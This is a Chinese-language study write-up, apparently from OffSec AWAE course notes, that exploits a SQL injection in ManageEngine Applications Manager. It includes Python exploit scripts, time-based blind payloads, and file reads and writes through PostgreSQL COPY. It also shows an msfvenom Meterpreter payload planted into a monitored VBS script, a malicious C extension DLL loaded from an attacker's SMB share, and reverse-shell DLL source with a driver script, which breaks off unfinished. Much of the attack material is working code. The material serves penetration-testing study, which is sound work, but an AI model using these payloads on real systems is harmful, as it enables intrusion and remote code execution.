```java=66
  public void fetchUserResourcesofMASForUserId(String userId, String masRange, PrintWriter out)
  {
    int stRange = Integer.parseInt(masRange);
    int endRange = stRange + EnterpriseUtil.RANGE;
    String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=" + userId + " and RESOURCEID >" + stRange + " and RESOURCEID < " + endRange;
    AMLog.debug("[AMUserResourcesSyncServlet::(fetchUserResourcesofMASForUserId)] qry : " + qry);
    
    ResultSet rs = null;
    try
    {
      rs = AMConnectionPool.executeQueryStmt(qry);
      while (rs.next())
      {
        String resId = rs.getString(1);
        out.println(resId);
      }
    }
    catch (Exception ex)
    {
      ex.printStackTrace();
    }
    finally
    {
      AMConnectionPool.closeStatement(rs);
    }
  }
```

可以明顯看出可能有 SQLi 漏洞: 根據 userId 與 masRange 範圍去資料庫查出 RESOURCEID 清單，然後逐行輸出到 HTTP response
- String concatenation
```
String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=" + userId + " and RESOURCEID >" + stRange + " and RESOURCEID < " + endRange;
```
- Sink
```
rs = AMConnectionPool.executeQueryStmt(qry);
```

>[!Note]
>為什麼看起來是 SQLi ？
> - `Source`： userId 來源是 HTTP request parameter（在 doGet 裡 request.getParameter("userId")）
> - `Sink`： executeQueryStmt(qry) 直接執行組合後的 SQL
> - `Missing sanitization`： userId 沒有 parseInt / whitelist / prepared statement
> > 典型資料流: user-controlled input → string concatenation → SQL execution

當確認漏洞存在時，進行 Reachability 分析：回去看 doGet 的 if/else
，以確認外部使用者能不能進入這條路徑？中間有沒有擋權限、條件、過濾等等？

需繞過 L32 與 L42 判斷式
![image](https://hackmd.io/_uploads/HJduTOEKbl.png)\
![image](https://hackmd.io/_uploads/SkKFa_NK-g.png)\
才會成功進入 else if L49\
![image](https://hackmd.io/_uploads/Hk7hauVtZx.png)
> 確保請求中 `isSyncConfigtoUserMap`, `chkRestrictedRole` 等參數沒有被設定，才可以執行到目標語句

### Enabling Database Logging
在 exploit 開發過程中，讓 DB 把實際收到執行的 SQL 寫入 log\
為了驗證：
- 送進 Web App 的 payload
- 到達資料庫時是否被改寫
- 是否被 escape
- 是否被自動加上引號
- 是否被框架轉換
- 是否產生語法錯誤

在 `C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\postgresql.conf` 中更改設定：\
![image](https://hackmd.io/_uploads/ryRj-QrY-l.png)
> 將 log_statement 改成 all

需要重啟 ManageEngine Applications Manager 服務以套用新設定
1. 透過 services.msc
在 services.msc 中找到 ManageEngine Applications Manager\ 
![image](https://hackmd.io/_uploads/r1SVfXrFbe.png)\
重啟即可：
![image](https://hackmd.io/_uploads/Sy9LGQBFbg.png)

2. Log 檔位置
```
C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\
```
>[!Tip]
>失敗的查詢會以 swissql 開頭:
>表示 ManageEngine 內部可能有 SQL 轉換層（例如 swissql 工具）負責跨 DB 相容，最終 PostgreSQL 還是會記錄。

3. pgAdmin 偵錯
在 exploit development 期間，需要能夠直接對資料庫執行 SQL 查詢來進行偵錯
![image](https://hackmd.io/_uploads/ByEBYQSt-l.png)

載入 pgAdmin 並連線至本機 ManageEngine Server\
![image](https://hackmd.io/_uploads/SyieFmSF-g.png)

可以透過 Tools > Query Tool 查詢\
![image](https://hackmd.io/_uploads/HJlcHHSY-x.png)

4. psql.exe（CLI）偵錯
若不想用 pgAdmin GUI，也可以使用 `psql.exe` PostgreSQL 官方 CLI\
(ManageEngine instance 監聽在 15432 port; ~~PostgreSQL 預設 port 是 5432~~) \
![image](https://hackmd.io/_uploads/Hk-_crStbl.png)

### Triggering the Vulnerability
把白箱分析轉為實際請求

1. 確認 routing
在 `C:\Program Files (x86)\ManageEngine\AppManager12\working\WEB-INF\web.xml` 查看服務 routing:
![image](https://hackmd.io/_uploads/HyIIadrFbl.png)\
![image](https://hackmd.io/_uploads/HyIQadBK-e.png)
> - 代表這個 servlet 的對應路徑: `/servlet/AMUserResourcesSyncServlet`\
> - servlet class : `com.adventnet.appmanager.servlets.comm.AMUserResourcesSyncServlet`
> > 同時能夠確認白箱分析的 class 與實際 HTTP endpoint 完全對應

2. 構造最小 request
- 需要 ForMasRange
- 需要 userId
- ~~isSyncConfigtoUserMap~~
- ~~chkRestrictedRole~~

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;
```
使用分號執行了基本的注入，嘗試在註入點用分號結束查詢

>[!Tip]
>為什麼用分號？\
>已知原始 SQL 沒有單引號
>```sql
>select distinct(RESOURCEID)
>from AM_USERRESOURCESTABLE
>where USERID= + userId
>and RESOURCEID > stRange
>and RESOURCEID < endRange
>```
> 也就是：`USERID=1` 而不是 `USERID='1'`\
> 不需要跳脫引號，直接用語句終止符號 `;` 即可
> > Stacked Query Injection（堆疊查詢）


3. 建構 payload exploit
```python
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print("(+) usage %s <target>" % sys.argv[0])
        print("(+) eg: %s target" % sys.argv[0])
        sys.exit(1)

    t = sys.argv[1]

    sqli = ";"

    r = requests.get(
        'https://%s:8443/servlet/AMUserResourcesSyncServlet' % t,
        params='ForMasRange=1&userId=1%s' % sqli,
        verify=False
    )

    print(r.text)
    print(r.headers)

if __name__ == '__main__':
    main()
```
> - `urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)`: 關閉 HTTPS warning，忽略 SSL 憑證驗證
> - `if len(sys.argv) != 2:`: 檢查參數數量，必須提供一個目標參數
> - `t = sys.argv[1]`: 讀取目標 (target)
> - `sqli = ";"`: 設定 SQLi 字元
> - `params='ForMasRange=1&userId=1%s' % sqli`: 構造上述的 `ForMasRange=1&userId=1;`


![image](https://hackmd.io/_uploads/rkEYoTStbg.png)
> 回應為空 Content-Length 為 0

查看 SQL log: `C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\ `\
![image](https://hackmd.io/_uploads/rJIDlArt-g.png)

> - `execute <unnamed>`: 顯示資料庫實際收到的 SQL statement
> 分號 `;` 被當成 statement terminator ， 把原本 SQL query 切斷
> - `ERROR:  syntax error at or near "and" at character 2`: 開頭是 and ... 但前面沒有 select ... where ... 語法上下文，所以 PostgreSQL 看到孤立的 and 直接報 syntax error

注入的有效 payload:
- [Way 1] UNION-based（把資料 union 回來）
```
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT 1
```
UNION 必須欄位數一致且對應欄位型別也要相容\
(原查詢選的是 RESOURCEID，被定義為 BIGINT datatype，所以當 union 回來的東西不是數值型會出錯)\

- [Way 2] UNION + boolean-based blind（用 TRUE/FALSE 問問題）
```
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END
```
用二分逐字爆破把資料推回來 (對於 PostgreSQL 不考慮)\
PostgreSQL SQLi 可以透過 stacked queries
👉🏻 用 `;` terminator 再接第二條 statement

>[!Important]
> Stacked queries 缺點在於會回傳多個 result sets，導致 application logic 錯誤 (一次 query 對應一個 ResultSet)
>> `C:\Program Files (x86)\ManageEngine\AppManager12\logs\stdout.txt` 顯示:
>> ```
>> Error Message : Multiple ResultSets were returned by the query.
>> ```
>> 表示 AMConnectionPool 或底層 JDBC 無法處理 Multiple ResultSets，直接當成錯誤

既然回應內容型 exfiltration 會被 Multiple ResultSets 搞爛\
為了解決這個問題，同時又利用 stacked queries 特性，那就改用 time-based blind injection 
```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;
select+pg_sleep(10); HTTP/1.1
Host: manageengine:8443
```
只需要第二段語句被執行，並產生延遲。就算回應為空，只要觀察到明顯延遲，就能判定條件是否有效注入

撰寫 Exploit 更改 sqli payload:
```py
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print("(+) usage %s <target>" % sys.argv[0])
        print("(+) eg: %s target" % sys.argv[0])
        sys.exit(1)

    t = sys.argv[1]

    sqli = ";select pg_sleep(10);"

    r = requests.get(
        'https://%s:8443/servlet/AMUserResourcesSyncServlet' % t,
        params='ForMasRange=1&userId=1%s' % sqli,
        verify=False
    )

    print(r.text)
    print(r.headers)

if __name__ == '__main__':
    main()
```
![image](https://hackmd.io/_uploads/HyuzldLFbx.png)
> 10.602 s

## How Houdini Escapes
延伸有效負載中使用 stacked queries 的功能：\
在測試各種有效負載之後，可以發現了一個現象\
**在查詢中插入了一個單引號**：
```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1' HTTP/1.1
Host: manageengine:8443
```
![image](https://hackmd.io/_uploads/ryQeDdIFZl.png)
𝙌:為什麼 `'` DB log 會出現 `&#39` ?!\
𝐀: PostgreSQL 會噴 syntax error，因為 USERID 是整數欄位，後面多了 `'`，`'` 被 HTML entity encode 成 `&#39`\
🧠：Error message 是 integer &# integer ?!\
透露 DB 最後解析到的表達式裡出現 `&#` 這種 token，DB 把它當成 operator 或語法片段來嘗試解析。因為 USERID= 後面應該是 Integer，PostgreSQL 不會理解成字串或引號，而是當成語法的一部分，導致產生 integer &# integer 沒有 operator 的錯。

>[!Note]
>在 MySQL 中，這個問題很容易解決:
>```sql
>MariaDB [mysql]> select concat('1337',' h@x0r')
>    -> ;
>+-------------------------+
>| concat('1337',' h@x0r') |
>+-------------------------+
>| 1337 h@x0r              |
>+-------------------------+
>1 row in set (0.00 sec)
>
>MariaDB [mysql]> select concat(0x31333337,0x206840783072)
>    -> ;
>+-----------------------------------+
>| concat(0x31333337,0x206840783072) |
>+-----------------------------------+
>| 1337 h@x0r                        |
>+-----------------------------------+
>1 row in set (0.00 sec)
>```
>MySQL 的特性是`0x...` 在很多情況下會被當作 字串/位元組序列，並自動解碼成對應的 ASCII，所以可以不用引號就產生字串
>>但 PostgreSQL 的字面量規則比較嚴格：
>> - HEX/bytea/string 的 literal 通常仍需要明確語法
>> 常用的 `decode('...','base64')`、`convert_from(...)` 這些 function 的參數也必須是字串 literal
>> ```sql
>> select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
>> ```

### Using CHR and String Concatenation
PostgreSQL 的：
- `CHR(n)` 會回傳 Unicode code point 對應的字元（65 → 'A'）
- `||` 是字串拼接

`SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);`\
等價 `SELECT 'A' || 'W' || 'A' || 'E';`\
![image](https://hackmd.io/_uploads/BJPEktUKZl.png)

👉🏻 可以利用 `CHR + ||` 繞過引號被 HTML encode 的限制

- 字串拼接僅適用於 SELECT、INSERT、DELETE 等 basic queries
用 SQL 語句建立了一個名為 AWAE 的 table，其中包含 column of text，可以成功插入
```sql
CREATE TABLE AWAE (chw text); INSERT INTO AWAE(chw) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
```
![image](https://hackmd.io/_uploads/B1la4btIY-e.png)\
![image](https://hackmd.io/_uploads/BJw8ZKUF-x.png)

但是如果嘗試執行 COPY 函數至 OS file，query 將會失敗\
使用 CHR function 技巧將資料寫入檔案：
```sql
CREATE TABLE AWAE (chw text);
INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
COPY AWAE (chw) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65)||CHR(87)||CHR(65)||CHR(69));
```
![image](https://hackmd.io/_uploads/BJvsVK8KWl.png)
>`CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65)||CHR(87)||CHR(65)||CHR(69))`= `c:\\AWAE`\
>`VALUES ( ... ) ` 裡面本來就是放 expression（可以函數呼叫、運算、拼接），但 `COPY ... TO <file>` 的 <file> 在語法上通常要求的是字面量或特定 token

<file> 不是運算區，而是語法固定欄位

>[!Tip]
> CHR 拼接能產生字串，但不是所有 SQL 語句都允許在「需要 literal 的位置」放 expression

### It Makes Lexical Sense
PostgreSQL 的 Lexical Structure 以解決上述測試：
- `'` 會被 HTML encode 成 &#39
- 需要 'string' 的 SQL 語法都壞掉

尋找 PostgreSQL 是否有不需要 ' 的語法: [dollar-quoted string constants](https://www.postgresql.org/docs/9.2/sql-syntax-lexical.html)\
![image](https://hackmd.io/_uploads/rJxwI9UY-e.png)\
支援用 $ 美元符號括起來的字串常數，目的是為了讓包含帶有引號字串的語句更容易閱讀

>[!Important]
> - 兩個 dollar sign (`$$`) = 引號 (') 
> - 單一 dollar sign (`$`) = 表示一個「TAG」的開始
    
#### 1. Dollar-Quoted String: `$$`

- `$$chw$$` = `'chw'`
- `SELECT 'AWAE';` = `SELECT $$AWAE$$;`

#### 2. Dollar-Quoted String: `$`

- `$TAG$chw$TAG$` = `$$chw$$`
    
Tag 的作用只是避免字串出現 `$$` 時衝突\
Ex. `$abc$ text $$ inside $abc$`
    
以下 SQL example:
```sql
SELECT 'AWAE';
SELECT $$AWAE$$;
SELECT $TAG$AWAE$TAG$;
```
都會回傳 AWAE

dollar sign 可以解決 `COPY table TO 'file'` 不接受 expression 的問題：\
`COPY table TO $$file$$`
```sql
CREATE TEMP TABLE AWAE(chw text);INSERT INTO AWAE(chw) VALUES ($$chw41$$);
COPY AWAE(chw) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\chw41.txt$$;
```
![image](https://hackmd.io/_uploads/Bkx0KcIYbg.png)
![image](https://hackmd.io/_uploads/rk7Q9qIFWl.png)
> 成功寫入資料

## Blind Bats
已知：
- `;` 截斷 query
- stacked query 會回傳 multiple result sets，會讓處理結果爆掉
- `$$` dollar sign 解決 `'` 被 HTML encode 

利用以上特性測試 AMUserResourcesSyncServlet servlet
```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;<some query>;--+ HTTP/1.0
Host: manageengine:8443
```
1. 查 database administrator (DBA) 權限的原始 SQL
```sql
SELECT current_setting('is_superuser');
```
> 若 current user 是 superuser 會回傳 on    

![image](https://hackmd.io/_uploads/ByxEYhIYWl.png)
> 代表 WebApp 連 DB 用的帳號權限很大
    
2. 將 DBA 檢查改成條件成立才 sleep (time-based blind injection)
```request
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;
SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
Host: manageengine:8443
```
> - `--+`: 將 source code 後段的 and RESOURCEID > ... 註解掉
> - `$$is_superuser$$`, `$$on$$`: 利用 dollar sign 單引號特性繞過
    
3. 確認 payload 後撰寫 exploit
```py
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print("(+) usage %s <target>" % sys.argv[0])
        print("(+) eg: %s target" % sys.argv[0])
        sys.exit(1)

    t = sys.argv[1]

    sqli = "; SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"

    r = requests.get(
        'https://%s:8443/servlet/AMUserResourcesSyncServlet' % t,
        params='ForMasRange=1&userId=1%s' % sqli,
        verify=False
    )

    print(r.text)
    print(r.headers)

if __name__ == '__main__':
    main()

```
![image](https://hackmd.io/_uploads/ryhA52LF-g.png)
> (10.995 s)

## Accessing the File System
以上 payload 已確認:
- 可做 stacked queries
- 能用 time-based blind

但也不能從 response body 拿到資料\
接著利用[上述 Dollar-Quoted String COPY ... TO ..特性](#1-Dollar-Quoted-String-) 讀取本機的檔案內容\
暫時匯入資料庫讀取
```
COPY <table_name> to <file_name>
```
🧠：建一個暫存 table，將文件中的資料選擇到該 table 的內容，最後刪除 table
```sql
CREATE temp table awae (content text);
COPY awae from $$c:\awae.txt$$;
SELECT content from awae;
DROP table awae;
```
在 blind time-based query 中執行\
(因為看不到 SELECT content from awae 的結果)\
- 取內容的第 N 個字元轉成 ASCII 與猜的值比對
- 若猜對就 pg_sleep(10)
```request
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+ HTTP/1.0
Host: manageengine:8443
```
> ASCII 104 = h\
> 用猜測爆破的方式取出資料


寫檔相對容易，只需要讓 DB 把提供的內容輸出到一個路徑\
```sql
COPY (SELECT $$chw content$$) to $$c:\\chw.txt$$;
```
Request:
```request
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$chw content$$)+to+$$c:\\chw.txt$$;--+ HTTP/1.0
Host: manageengine:8443
```
![image](https://hackmd.io/_uploads/HJYIrT8Y-e.png)

順便檢查新增檔案的權限，我們以 DBA 權限寫入資料\
Web application 使用 SYSTEM 寫入\
![image](https://hackmd.io/_uploads/Hy-iSpLKbe.png)

### Reverse Shell Via Copy To
透過寫檔功能建構 Reverse Shell
(另一種手法可覆寫 ManageEngine 的現有 batch file，其思路是將 malicious commands 注入到 ManageEngine 應用程式將要執行的 batch file 中)

更 elegant 的方法是將惡意程式碼植入 ManageEngine 正常運作期間使用的 VBS file:
當 ManageEngine Application Manager 配置為監控遠端伺服器和應用程式時，會定期執行 VBS script (`C:\Program Files (x86)\ManageEngine\AppManager12\working\conf\application\scripts`) 目錄中，且功能各不相同

- 確認是否存在 Windows system monitor
進入 Web 介面檢查 ManageEngine Application Manager 建立 monitor process\
![image](https://hackmd.io/_uploads/SyfgMRLtZe.png)\
![image](https://hackmd.io/_uploads/rktgGC8FWg.png)

在 Sysinternals Process Monitor （Procmon）可以看到看出 `wmiget.vbs` 會被定期執行
![image](https://hackmd.io/_uploads/HJXCpkvK-e.png)

(確認 `wmiget.vbs`)\
![image](https://hackmd.io/_uploads/rkkk2aPF-g.png)


產生 Meterpreter Reverse shell 有效 payload 插入到文件末

>[!Note]
> 注入 malicious code 前備份原檔＋保留原功能
> - 備份目標文件 (完成攻擊後復原)
> - 內容轉換為 one-liner 程式碼，確保能夠正常執行，COPY + SELECT string 無法在單一 SELECT 語句中處理換行符號
> - 在 GET request 中對 payload 進行 double-encode (base64 + URL encode)
>```sql
>copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
>```
> - payload 太大，GET 長度限制\
>(`doPost()` 只是呼叫 `doGet()` 因次用 POST 傳參數不會影響漏洞邏輯)


```
┌──(chw💲CHW)-[~]
└─$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={Kali IP} LPORT=8888 -e x86/shikata_ga_nai -f vbs
```
> 產生 base64 paylaod
    
![image](https://hackmd.io/_uploads/HkwMk0wKWe.png)

測試手動轉成 one-liner code 並加入 reverse
![image](https://hackmd.io/_uploads/rJ45yCvYbg.png)

手動成功後取得 revshell 後，代表方法可行\
建構 HTTP request payload:
```
copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
```
![image](https://hackmd.io/_uploads/SkJKx0vFbl.png)

## PostgreSQL Extensions
透過 PostgreSQL 的 extension 機制達到 RCE
根據 [Postgres documentation](https://www.postgresql.org/docs/) 得知，可以利用以下 `CREATE OR REPLACE FUNCTION`...`AS` 載入 extension\
![image](https://hackmd.io/_uploads/Hkmv4fOt-g.png)
```sql
CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;
```
> 建立一個 test() 的 SQL function。但實際不是 SQL，而是在 C 動態函式庫中
> - `AS 'FILENAME', 'test'`: FILENAME 動態函式庫 (.dll / .so); test 函式名稱
> - `LANGUAGE 'C'`: 告訴 PostgreSQL 是 C 語言
>> 可以直接讓 PostgreSQL 呼叫 Windows API, Linux libc 等任意本地 library

SQL → Windows API → 執行系統命令:
```sql
CREATE OR REPLACE FUNCTION system(cstring)
RETURNS int
AS 'C:\Windows\System32\kernel32.dll', 'WinExec'
LANGUAGE C STRICT;
```
![image](https://hackmd.io/_uploads/BkeIYfOK-g.png)


>[!Note]
> PostgreSQL 有安全機制：\
>**"extension library 必須包含 magic block"**
> 在載入 C library 時 extension 的 C code 會檢查 `PG_MODULE_MAGIC` 確認 library 是為 PostgreSQL 編譯的，避免亂載入不相容的 binary
>```c
>#include "postgres.h"
>#include "fmgr.h"
>
>PG_MODULE_MAGIC;
>```
>> 建立 metadata 結構告訴 PostgreSQL extension 的 module version, ABI compatibility, server compatibility

ATTACKER 🧠：自己編譯一個 PostgreSQL extension DLL，包含 PG_MODULE_MAGIC 、自定義 C function，利用 function 內部呼叫 OS command
```
SQL Injection
      │
      ▼
Stacked Queries
      │
      ▼
DBA privileges
      │
      ▼
Upload malicious DLL
      │
      ▼
CREATE FUNCTION ... LANGUAGE C
      │
      ▼
SQL function → C code
      │
      ▼
OS command execution
```

### Build Environment
為了利用 PostgreSQL extension 機制，需要自己編譯一個符合 PostgreSQL extension 規範的 DLL

[環境範例]\
透過 Visual Studio 2017 編譯 awae.sln ，裡面有個 `poc.c` PostgreSQL extension 的程式。\
![image](https://hackmd.io/_uploads/BJo5zC5tZe.png)\
![image](https://hackmd.io/_uploads/rJDAfCctWe.png)

```cpp
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(awae);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
awae(PG_FUNCTION_ARGS)
{
	/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

	/* retrieve the second argument that is passed to the function (an integer)
	that will serve as our counter limit*/

	int instances = PG_GETARG_INT32(1);

	for (int c = 0; c < instances; c++) {
		/*launch the process passed in the first parameter*/
		ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
	}
	PG_RETURN_VOID();
}
```
awae function 使用 Windows 本地 ShellExecute() 啟動任意 process                                
                                  
> - `postgres.h`: 包含 PostgreSQL 內部資料型別、巨集、函式宣告
> - `fmgr.h`: fmgr.h 是 PostgreSQL Function Manager 的標頭檔，提供: (讓 C function 能被 PostgreSQL 當作 SQL 函式呼叫)
>    - PG_FUNCTION_ARGS
>    - PG_GETARG_INT32()
>    - PG_GETARG_TEXT_P()
>    - PG_RETURN_VOID()
>    - Datum
>    - PG_FUNCTION_INFO_V1()
> - `utils/builtins.h`: 涉及 PostgreSQL 內建函式的宣告 `DirectFunctionCall1(textout, ...)`
> - `PG_MODULE_MAGIC;`: extension 標記 MODULE MAGIC (必要結構)
> - `PG_FUNCTION_INFO_V1(awae);`: 使用 [Version-1 function calling convention](https://zh.wikipedia.org/zh-tw/%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A#:~:text=%E5%9C%A8%E9%9B%BB%E8%85%A6%E7%A7%91%E5%AD%B8%E4%B8%AD%EF%BC%8C%E5%91%BC%E5%8F%AB,%E5%8F%83%E6%95%B8%E4%B8%8D%E5%90%8C%E9%83%A8%E5%88%86%E7%9A%84%E9%A0%86%E5%BA%8F%EF%BC%89)
> - `GET_STR`: 透過巨集將 PostgreSQL 的 `text *` 轉成 C 的 `char *`
>> `SELECT awae('calc.exe', 5);`\
>> - `PG_GETARG_TEXT_P(0)` 會拿到 'calc.exe'
>> - `PG_GETARG_INT32(1)` 會拿到 5
>
> - `ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);`: Windows API 用來讓 Shell 根據指定動作去開啟某個檔案、程式或 URL ('calc.exe')
    
在 Visual Studio 2017 透過 `Ctrl + Shift + B`  或 `Build > Build Solution` 編譯\
**![image](https://hackmd.io/_uploads/rkWNxysFWg.png)
**
```
------ Build started: Project: awae, Configuration: Release Win32 ------
   Creating library C:\Users\Administrator\source\repos\awae\Release\awae.lib and object C:\Users\Administrator\source\repos\awae\Release\awae.exp
Generating code
Finished generating code
All 3 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
rs.vcxproj -> C:\Users\Administrator\source\repos\awae\Release\awae.dll
Done building project "rs.vcxproj".
========== Rebuild All: 1 succeeded, 0 failed, 0 skipped ==========
```

### Testing the Extension
測試剛剛編譯好的 PostgreSQL extension DLL 是否可以被資料庫載入並執行\
已編譯出 `awae.dll` 且 DLL 包含 PostgreSQL UDF function `awae()`，會呼叫 Windows API `ShellExecute()` 來執行程式

#### - 建立 PostgreSQL UDF
(為方便呼叫檔案，將 `awae.dll` 移至 C://)\
![image](https://hackmd.io/_uploads/BkIngyjtWl.png)
```sql
create or replace function test(text, integer) returns void as $$C:\awae.dll$$, $$awae$$ language C strict;
SELECT test($$calc.exe$$, 3);
```
> 在 PostgreSQL 建立 SQL function `test(text, integer)`
>> SQL function test()  →  C DLL awae() function

![image](https://hackmd.io/_uploads/BJgAgksYZg.png)\
成功執行 SELECT 查詢後打開 Task Manager 可以看到確實有三個calc.exe 正在執行\
![image](https://hackmd.io/_uploads/r1V4MJstbg.png)

若在 dev 過程中出錯，可以透過以下刪除 function 並重啟服務 (復原環境)
```
c:\> net stop "Applications Manager"
c:\> del c:\awae.dll
c:\> net start "Applications Manager"
```
SQL
```sql
DROP FUNCTION test(text, integer);
```

### Loading the Extension from a Remote Location
上述範例 DLL 已經存在於 target machine，但真實情況中，攻擊者無法直接把 DLL 放到目標機器

#### - PostgreSQL 支援 network path
PostgreSQL 在載入 DLL 時並沒有要求 DLL 一定是本地檔案

🧠： 在 Kali 建立 SMB share，將 DLL 放進 share。再透過 PostgreSQL 建立 UDF

(Kali)
```
┌──(chw💲CHW)-[~]
└─$ mkdir /home/chw/awae

┌──(chw💲CHW)-[~]
└─$ sudo impacket-smbserver awae /home/chw/awae/
[sudo] password for chw: 
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

(PostgreSQL 建立 UDF)
```sql
CREATE OR REPLACE FUNCTION remote_test(text, integer)
RETURNS void
AS $$\\{Kali IP}\awae\awae.dll$$, $$awae$$
LANGUAGE C
STRICT;
```
> 連線 SMB share、下載 DLL、載入 DLL、註冊 function

(PostgreSQL 執行 function)
```sql
SELECT remote_test($$calc.exe$$, 3);
```

>[!Important]
> 在真實環境中，若存在 SQL injection 但沒有 file upload\
> 👉🏻 透過 load remote DLL 執行

## UDF Reverse Shell
統整上述特型，建立 socket reverse shell
```
PostgreSQL UDF → 載入自訂 DLL → 建立 socket → 啟動 cmd.exe → 把標準輸入輸出導到 socket
```

C code reverse shell: (編譯成 dll)
```cpp
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include <winsock2.h>
#include "utils/builtins.h"
#pragma comment(lib, "ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(connect_back);

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;

Datum
connect_back(PG_FUNCTION_ARGS)
{

	/* convert C string to text pointer */
#define GET_TEXT(cstrp) \
   DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))

	/* convert text pointer to C string */
#define GET_STR(textp) \
  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	/* FIX THIS */
	hax.sin_port = XXXXXXXXXXXXX
	/* FIX THIS TOO*/
	hax.sin_addr.s_addr = XXXXXXXXXXXXXXX

	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	PG_RETURN_VOID();
}
```

Python Scrit 
```py
import requests, sys
requests.packages.urllib3.disable_warnings()

def log(msg):
   print msg

def make_request(url, sql):
   log("[*] Executing query: %s" % sql[0:80])
   r = requests.get( url % sql, verify=False)
   return r

def create_udf_func(url):
   log("[+] Creating function...")
   sql = "create or replace function rev_shell(text, integer) returns void as $$\\\\{Kali IP }\\awae\\rev_shell.dll$$, $$connect_back$$ language C strict"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
